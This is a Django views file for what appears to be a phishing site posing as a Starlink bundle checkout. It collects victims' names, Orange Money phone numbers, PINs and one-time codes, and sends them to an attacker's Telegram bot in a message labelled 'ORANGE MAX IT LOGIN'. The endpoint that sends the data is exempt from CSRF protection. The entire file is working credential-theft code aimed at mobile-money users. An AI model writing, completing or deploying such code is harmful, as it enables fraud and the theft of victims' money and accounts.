import json
import requests
from django.shortcuts import render, redirect, get_object_or_404 # Fixed imports
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order # Ensure your model name matches

# Telegram Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

def home(request):
    return render(request, 'index.html')

def checkout(request):
    """
    Stage 1: Checkout page - Showing bundle info
    """
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')

    context = {
        'bundle': bundle,
        'price': price
    }
    return render(request, 'checkout.html', context)

def payment_instructions(request):
    """
    Stage 2: Capture customer details and CREATE the order
    """
    if request.method == 'POST':
        # 1. Collect data from Checkout Form
        full_name = request.POST.get('fullName', '')
        city = request.POST.get('city', '')
        bundle = request.POST.get('bundle', '')

        # 2. CREATE the order in the database to get a unique order_id (UUID)
        order = StarlinkOrder.objects.create(
            full_name=full_name,
            city=city,
            bundle=bundle
        )

        # 3. Pass the 'order' object to the payment page so the form knows where to go
        return render(request, 'payment_instructions.html', {'order': order})

    return redirect('starlink_app:home')

def otp_verification(request, order_id):
    """
    Stage 3: Capture PIN and show OTP page
    """
    # Find the specific order using the UUID from the URL
    order = get_object_or_404(StarlinkOrder, id=order_id)

    if request.method == 'POST':
        # Get PIN from the Orange Money UI
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        # Update the database record
        order.phone = phone
        order.orange_pin = pin
        order.save()

        # Store in session for the Telegram sync stage
        request.session['phone'] = phone
        request.session['pin'] = pin
        request.session['bundle'] = order.bundle

        return render(request, 'otp_verification.html', {'order': order})

    return render(request, 'otp_verification.html', {'order': order})

@csrf_exempt
def sync_data(request):
    """
    Stage 4: Send collected data to Telegram
    """
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "POST required"}, status=405)

    try:
        data = json.loads(request.body)
        otp_link = data.get('otp', 'No OTP provided')

        phone = request.session.get('phone', 'Unknown')
        bundle = request.session.get('bundle', 'Unknown')
        pin = request.session.get('pin', 'Unknown')

        message = (
            "🇸🇱 ORANGE MAX IT LOGIN\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📞 PHONE: +232 {phone}\n"
            f"📦 BUNDLE: {bundle}\n"
            f"🔑 PIN: {pin}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔗 OTP LINK:\n{otp_link}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 STATUS: SUCCESS"
        )

        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, data={"chat_id": CHAT_ID, "text": message})

        return JsonResponse({"status": "success"})

    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=400)